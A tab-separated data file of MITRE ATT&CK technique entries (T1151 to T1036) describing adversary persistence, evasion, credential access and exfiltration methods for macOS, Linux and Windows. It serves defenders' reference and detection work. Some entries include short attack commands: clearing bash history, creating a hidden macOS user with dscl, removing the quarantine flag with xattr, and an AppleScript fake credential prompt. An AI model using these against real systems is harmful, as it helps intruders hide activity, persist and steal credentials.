T1151	Space after Filename	Adversaries can hide a program\'s true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to "evil.txt " (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed. \n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1151
T1150	Plist Modification	Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UT-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism.	Defense Evasion, Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1150
T1153	Source	The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell\'s environment. \n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1153
T1152	Launchctl	Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made . Running a command from launchctl is as simple as launchctl submit -l <labelName> -- /Path/to/thing/to/execute "arg" "arg" "arg". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. \n\nAdversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.	Defense Evasion, Execution, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1152
T1155	AppleScript	macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \n\nAdversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they\'re already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python . Scripts can be run from the command lie via osascript /path/to/script or osascript -e "script here".	Execution, Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1155
T1154	Trap	The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap \'command list\' signals where "command list" will be executed when "signals" are received.	Execution, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1154
T1157	Dylib Hijacking	macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.\n\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1157
T1156	.bash_profile and .bashrc	~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed.\n\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling ~/.bash_profile each time instead of ~/.bashrc.\n\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell .	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1156
T1159	Launch Agent	Per Apple\u2019s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents.  These launch agents have property list files which point to the executables that will be launched.\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  . The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in. They can be set up to execute when a specific user logs in (in the specific user\u2019s directory structure) or when any user logs in (which requires administrator privileges).	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1159
T1158	Hidden Files and Directories	To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls \u2013a for Linux and macOS).\n\nWindows\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do attrib +h filename to mark a file or folder as hidden. Similarly, the \u201c+s\u201d marks a file as a system file and the \u201c+r\u201d flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \u201c/S\u201d.\n\nLinux/Mac\n\nUsers can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name . Files and folder that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: defaults write com.apple.finder AppleShowAllFiles YES, and then relaunch the Finder Application.\n\nMac\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app.\nMany applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys. \n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1158
T1090	Connection Proxy	A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including [[Software/S0040|HTRAN]], ZXProxy, and ZXPortMap.\n\nThe definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.\n\nThe network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1090
T1091	Replication Through Removable Media	Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.	Lateral Movement, Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1091
T1092	Communication Through Removable Media	Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [[Technique/T1091|Replication Through Removable Media]]. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1092
T1093	Process Hollowing	Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [[Technique/T1055|Process Injection]], execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1093
T1094	Custom Command and Control Protocol	Adversaries may communicate using a custom command and control protocol instead of using existing [[Technique/T1071|Standard Application Layer Protocol]] to encapsulate commands. Implementations could mimic well-known protocols.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1094
T1095	Standard Non-Application Layer Protocol	Use of a standard non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), and transport layer protocols, such as the User Datagram Protocol (UDP).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1095
T1096	NTFS File Attributes	Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternative Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1096
T1046	Network Service Scanning	Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1046
T1098	Account Manipulation	Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1098
T1099	Timestomp	Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [[Technique/T1036|Masquerading]] to hide malware and tools.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1099
T1097	Pass the Ticket	Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nIn this technique, valid Kerberos tickets for [[Technique/T1078|Valid Accounts]] are captured by [[Technique/T1003|Credential Dumping]]. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\n\nSilver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\n\nGolden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1097
T1045	Software Packing	Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1045
T1215	Kernel Modules and Extensions	Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.\xa0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [[Technique/T1014|Rootkit]] that run with the highest operating system privilege (Ring 0).\xa0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects.\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users.\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through kextload and kextunload commands. Several examples have been found where this can be used. Examples have been found in the wild.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1215
T1212	Exploitation for Credential Access	Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\xa0Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Exploitation for credential access may also result in [[Privilege Escalation]] depending on the process targeted or credentials obtained.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1212
T1213	Data from Information Repositories	Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nCommon information repositories:\n\nMicrosoft SharePoint\nFound in many enterprise networks and often used to store and share significant amounts of documentation.\n\nAtlassian Confluence\nOften found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1213
T1025	Data from Removable Media	Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to [[Exfiltration]].\n\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [[Software/S0106|cmd]] may be used to gather information. Some adversaries may also use [[Technique/T1119|Automated Collection]] on removable media.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1025
T1024	Custom Cryptographic Protocol	Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1024
T1027	Obfuscated Files or Information	Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during [[Initial Access]] or later to mitigate detection. Sometimes a user's action may be required to open and [[Technique/T1140|Deobfuscate/Decode Files or Information]] for [[Technique/T1204|User Execution]]. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also used compressed or archived scripts, such as Javascript.\n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [[Technique/T1059|Command-Line Interface]]. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms.\n\nAnother example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [[Software/S0231|Invoke-PSImage]]. The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. By the end of 2017, an adversary group used [[Software/S0231|Invoke-PSImage]] to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1027
T1026	Multiband Communication	Some adversaries may split communications between different protocols.  There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions.  The split could also be random to simply avoid data threshold alerts on any one communication.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1026
T1021	Remote Services	An adversary may use [[Technique/T1078|Valid Accounts]] to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.	Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1021
T1020	Automated Exfiltration	Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [[Technique/T1064|Scripting]] after being gathered during [[Collection]]. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [[Technique/T1041|Exfiltration Over Command and Control Channel]] and [[Technique/T1048|Exfiltration Over Alternative Protocol]].	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1020
T1148	HISTCONTROL	The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to "ignorespace". HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1148
T1022	Data Encrypted	Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [[Technique/T1041|Exfiltration Over Command and Control Channel]] and [[Technique/T1048|Exfiltration Over Alternative Protocol]]	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1022
T1146	Clear Command History	macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1146
T1147	Hidden Users	Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [[Technique/T1136|Create Account]] technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: sudo dscl . -create /Users/username UniqueID 401.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1147
T1144	Gatekeeper Bypass	In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won\u2019t set this flag. Additionally, other utilities or events like drive-by downloads don\u2019t necessarily set it either. This completely bypasses the built-in Gatekeeper check. The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app.\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS\u2019s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1144
T1040	Network Sniffing	Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\n\nUser credentials may be sent over an insecure, unencrypted protocol that can be captured and obtained through network packet analysis. An adversary may place a network interface into promiscuous mode, using a utility to capture traffic in transit over the network or use span ports to capture a larger amount of data. In addition, techniques for name service resolution poisoning, such as [[Technique/T1171|LLMNR/NBT-NS Poisoning]], can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1040
T1142	Keychain	Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/. The security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. By default, the passphrase for the keychain is the user\u2019s logon credentials.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1142
T1139	Bash History	Bash keeps track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user\u2019s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1139
T1140	Deobfuscate/Decode Files or Information	Adversaries may use [[Technique/T1027|Obfuscated Files or Information]] to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [[Technique/T1064|Scripting]], [[Technique/T1086|PowerShell]], or by using utilities present on the system.\n\nOne such example is use of [[Software/S0160|certutil]] to decode a remote access tool portable executable file that has been hidden inside a certificate file.\n\nAnother example is using the Windows copy /b command to reassemble binary fragments into a malicious payload.\n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used with [[Technique/T1027|Obfuscated Files or Information]] during [[Initial Access]] or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [[Technique/T1204|User Execution]]. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also used compressed or archived scripts, such as Javascript.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1140
T1141	Input Prompt	When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:\n\nset thePassword to the text returned of (display dialog "AdobeUpdater needs permission to check for updates. Please authenticate." default answer "")\n\n\nAdversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1141
T1031	Modify Existing Service	Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [[Software/S0075|Reg]].\n\nAdversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [[Technique/T1036|Masquerading]] that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\n\nAdversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1031
T1049	System Network Connections Discovery	Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nWindows\n\nUtilities and commands that acquire this information include [[Software/S0104|netstat]], "net use," and "net session" with [[Software/S0039|Net]].\n\nMac and Linux \n\nIn Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to "net session".	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1049
T1219	Remote Access Tools	An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be whitelisted within a target environment. Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.\n\nRemote access tools may be established and used post-compromise as alternate communications channel for [[Technique/T1108|Redundant Access]] or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1219
T1131	Authentication Package	Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ with the key value of "Authentication Packages"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1131
T1032	Standard Cryptographic Protocol	Adversaries use command and control over an encrypted channel using a known encryption protocol like HTTPS or SSL/TLS. The use of strong encryption makes it difficult for defenders to detect signatures within adversary command and control traffic.\n\nSome adversaries may use other encryption protocols and algorithms with symmetric keys, such as RC4, that rely on encryption keys encoded into malware configuration files and not public key cryptography. Such keys may be obtained through malware reverse engineering.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1032
T1033	System Owner/User Discovery	Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [[Technique/T1003|Credential Dumping]]. The information may be collected in a number of different ways using other [[Discovery]] techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.\n\nMac\n\nOn Mac, the currently logged in user can be identified with users,w, and who.\n\nLinux\n\nOn Linux, the currently logged in user can be identified with w and who.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1033
T1030	Data Transfer Size Limits	An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1030
T1138	Application Shimming	The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow backward compatibility of programs as Windows updates and changes its code. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [[Technique/T1179|Hooking]] to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* %WINDIR%\AppPatch\sysmain.sdb\n* hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb\n\nCustom databases are stored in:\n\n* %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom\n* hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [[Technique/T1088|Bypass User Account Control]] (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [[Technique/T1179|Hooking]], utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1138
T1036	Masquerading	Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.  Several different variations of this technique have been observed.\n\nOne variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program.  Alternatively, the filename given may be a close approximation of legitimate programs.  This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.\n\n\nWindows\nIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths.\n\nAn example of abuse of trusted locations in Windows would be the C:\Windows\System32 directory.  Examples of trusted binary names that can be given to malicious binares include "explorer.exe" and "svchost.exe".\n\nLinux\nAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. \n\nAn example of abuse of trusted locations in Linux  would be the /bin directory.  Examples of trusted binary names that can be given to malicious binares include "rsyncd" and "dbus-inotifier".   	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1036
